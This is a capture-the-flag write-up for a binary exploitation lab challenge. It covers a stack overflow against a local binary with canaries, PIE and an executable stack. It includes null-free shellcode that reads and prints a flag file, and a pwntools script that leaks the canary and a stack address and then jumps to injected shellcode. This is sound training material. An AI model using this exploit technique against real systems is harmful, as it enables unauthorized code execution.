This challenge was just amazingly educative, and quite tricky to solve, though it's been the most fun yet to realize in Exploitation Scenarios. Note that i started by doing 3.1 instead of 3.0 because i hate all the verbosity present in 3.0, which ends up slowing me down.

The challenge has the following protections enabled.
```
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

**Position Independent Executable**, **Canaries**, **NX** and **Full RELRO** are enable, which gonna make the binary quite harder for us to exploit.

As you can expect, in this challenge we are gonna need to leak the canary using a buffer overflow, then we are going to have to leak a stack address which we can then offset with our input buffer to leak its address, then once we leaked these 2 values we can send shellcode and jump to our input buffer, which will proceed to execute the shellcode.

As seen in the previous challenges in babymem, the program allow us to send multiple time the input using the "hidden" backdoor in our program, basically if our input contain the following sequence "REPEAT", then it will call the function again and again, this allow us to leak many things.

Another caveat to take not of is that our shellcode can't contain null bytes, the shellcode is being read with the read syscall which will stop reading when stumbling upon a null byte.

## Solution
So with this knowledge about the challenge, you should be able to go and solve it by your own but if you can't achieve this you can always look at my solution down there.

### **Shellcode :**

```x86asm
.global _start
.intel_syntax noprefix
_start:
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x67616c662f
        xor [rsp], rax
        push 2
        pop rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        syscall
        mov esi, eax
        push 40
        pop rax
        push 1
        pop rdi
        xor edx, edx
        mov r10b, 0xff
        syscall
```

### **Python Script**

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template toddlerone_level3.1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('toddlerone_level3.1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

shellcode = b""
with open("3.bytes", "rb") as file:
    for i in file.readlines():
        shellcode += i

print(shellcode)
print(len(shellcode))

io = start()
input()
padding = 88
# First Leak
io.sendline(b"200")
io.sendline(b"REPEAT" + b"A" * (88 - len("REPEAT")))
io.readline()
io.readline()
io.readline()
io.readline()
io.readline()
io.readline()
canary = u64(io.readline()[:7].rjust(8, b"\x00"))
#c = bytes.fromhex(hex(canary)[2:] + "00")
log.info(f"Leaked Canary : {hex(canary)}")
# Second Leak
io.sendline(b"20000")
io.write(b"REPEAT" + b"A" * (96 - len("REPEAT")))
io.readline()
io.readline()
stack_addr = u64(io.readline()[-7:].ljust(8, b"\x00"))
stack_base = int(hex(stack_addr)[3:], 16)
log.info(f"Input Buffer Address : {hex(stack_base - 272 - 176)}")
# Final Leak
#
io.sendline(b"2000")
io.write(shellcode + b"\x90" * (88 - len(shellcode)) + p64(canary) + b"\x90" * (8) + p64(stack_base - 272 - 176))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```